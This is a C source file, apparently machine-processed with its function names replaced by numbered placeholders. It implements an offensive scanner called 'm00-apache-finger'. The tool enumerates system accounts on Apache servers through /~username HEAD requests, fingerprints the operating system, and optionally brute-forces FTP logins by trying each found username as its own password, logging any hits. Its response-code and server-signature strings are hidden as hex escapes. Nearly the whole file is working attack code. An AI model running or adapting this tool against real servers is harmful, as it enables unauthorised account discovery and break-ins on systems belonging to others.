#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int DEFAULT_FTP_PORT ; 
 int DEFAULT_HTTP_PORT ; 
 char EOF ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (char*,int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC5 (char*,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC6 (char*,char*) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ *,char*) ; 
 char FUNC8 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC9 () ; 
 scalar_t__ FUNC10 (int) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC12 (char*,int,int) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC13 (char*,...) ; 
 int /*<<< orphan*/  FUNC14 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*,...) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*) ; 
 int FUNC17 (char*) ; 
 scalar_t__ FUNC18 (char*,char*) ; 
 int /*<<< orphan*/  FUNC19 (char*) ; 
 int /*<<< orphan*/  FUNC20 (char*) ; 
 int /*<<< orphan*/  FUNC21 (int,char*,int) ; 

int FUNC22(int argc, char *argv[]) {
FILE *userlist, *logfile;
char *file=NULL;
char *lfile=NULL;
char *host=NULL;
char buf[0x20], check[0x20], request[0xc8], answer[0x3e8], c,logd[0x30];
int i,hand,x,f,v=0,brute=0;
int port = DEFAULT_HTTP_PORT;
int fport = DEFAULT_FTP_PORT;

char c200[0x05] =
"\x20\x32\x30\x30\x20";
char c403[0x0e] =
"\x34\x30\x33\x20\x46\x6f"
"\x72\x62\x69\x64\x64\x65\x6e";
char c404[0x0e] =
"\x34\x30\x34\x20\x4e\x6f\x74"
"\x20\x46\x6f\x75\x6e\x64";
char signature[0x0f] =
"\x53\x65\x72\x76\x65\x72\x3a"
"\x20\x41\x70\x61\x63\x68\x65";
char *http =
"Accept: */*\r\n"
"Accept-Language: en-us,en;q=0.5\r\n"
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
"User-Agent: m00-apache-finger\r\n"
"Connection: close\r\n\r\n";
char **logz;

FUNC9();

if(argc<2) FUNC19(argv[0]);
while((c = FUNC8(argc, argv, "t:u:hp:vbl:"))!= EOF) {
switch (c) {
case 't':
host=optarg;
break;
case 'u':
file=optarg;
break;
case 'p':
port=FUNC0(optarg);
break;
case 'l':
lfile=optarg;
break;
case 'b':
brute=1;
break;
case 'v':
v=1;
break;
case 'h':
FUNC19(argv[0]);
return 1;
default:
FUNC19(argv[0]);
return 1;
}
}

if(host==NULL) { FUNC19(argv[0]); }
if(file==NULL) { FUNC19(argv[0]); }

if(lfile && (logfile = FUNC6(lfile, "a")) == 0) {
FUNC13("[-] unable to open logfile [%s]\n",lfile);
FUNC3(0);
}

if((userlist = FUNC6(file, "r")) == 0) {
FUNC13("[-] unable to open userlist [%s]\n",file);
FUNC3(0);
}

logz = (char **)FUNC10(0x666);

FUNC13("[*] Checking http server [%s:%i]...\n",host,port);

hand = FUNC2(host,port);
FUNC15(request,"HEAD /~root HTTP/1.1\r\nHost: %s\r\n%s",host,http);

FUNC21(hand,request,FUNC17(request));
FUNC14(hand,answer,0x3e8,0);

if(v) FUNC20(answer);

FUNC13(" Apache => ");
if(!FUNC18(answer,signature)) { FUNC13(" no\n Vulnerable => "); } else FUNC13(" yes\n Vulnerable => ");
if(!FUNC18(answer,c403)) { FUNC13("no\n[-] Exiting...\n"); FUNC3(0); } else FUNC13("yes\n");
FUNC1(hand);

hand = FUNC2(host,port);
FUNC15(request,"HEAD /~toor HTTP/1.1\r\nHost: %s\r\n%s",host,http);
FUNC21(hand,request,FUNC17(request));
FUNC14(hand,answer,0x3e8,0);

if(v) FUNC20(answer);

FUNC13(" OS => ");
if(FUNC18(answer,c403)) { FUNC13("FreeBSD"); } else {
if(FUNC18(answer,"Unix")) FUNC13("Unix unknow");
if(FUNC18(answer,"Debian")) FUNC13("Debian Linux");
if(FUNC18(answer,"RedHat")) FUNC13("RedHat Linux");
if(FUNC18(answer,"mdk")) FUNC13("Mandrake Linux");
}
FUNC1(hand);

FUNC13("\n[*] Searching for system accounts...");

if(lfile) {
FUNC15(logd,"Host: %s\nFound accounts:\n",host);
FUNC7(logfile,logd);
}

x=0;
f=0;
while (1) {
FUNC5(buf, 32, userlist);
if (buf[0] == '\n' || FUNC18(check,buf)) break;
FUNC16(check,buf);
buf[FUNC17(buf)-1] = '\0';
x++;

FUNC13("\n %s \t=> ",buf);


hand = FUNC2(host,port);
FUNC15(request,"HEAD /~%s HTTP/1.1\r\nHost: %s\r\n%s",buf,host,http);

FUNC21(hand,request,FUNC17(request));
FUNC14(hand,answer,0x3e8,0);

if(v) FUNC20(answer);

if(!FUNC18(answer,c404)) {
FUNC13(" yes",buf);
if(lfile) {
FUNC15(logd,"%s\n",buf);
FUNC7(logfile,logd);
}
logz[f] = (char *)FUNC10(FUNC17(buf));
FUNC11(logz[f],buf,FUNC17(buf));
FUNC12(logz[f]+FUNC17(buf),0x0,1);
f++;
}
FUNC1(hand);
}
FUNC4(userlist);
FUNC13("\n[*] Searching complete.\n");
FUNC13(" %i users checked\n %i users found\n",x,f);
if(brute && f>0) {
x=0;
i=0;
if(lfile) {
FUNC15(logd,"FTP:\n");
FUNC7(logfile,logd);
}
FUNC13("[*] Attempting to log on ftp with login:login...\n");
while(x!=f) {
FUNC13(" %s:%s \t=>",logz[x],logz[x]);
hand = FUNC2(host,fport);

FUNC15(request,"USER %s\n",logz[x]);
FUNC21(hand,request,FUNC17(request));
FUNC14(hand,answer,0x3e8,0);

FUNC15(request,"PASS %s\n",logz[x]);
FUNC21(hand,request,FUNC17(request));
FUNC14(hand,answer,0x3e8,0);
if(FUNC18(answer,"230")) {
FUNC13(" yes\n");
if(lfile) {
FUNC15(logd,"%s:%s\n",logz[x],logz[x]);
FUNC7(logfile,logd);
}
i++;
} else FUNC13(" no\n");
FUNC1(hand);
x++;
}
FUNC13("[*] Complete.\n");
FUNC13(" %i ftp accounts found\n",i);
}
if(lfile) {
FUNC7(logfile,"\n");
FUNC4(logfile);
}

}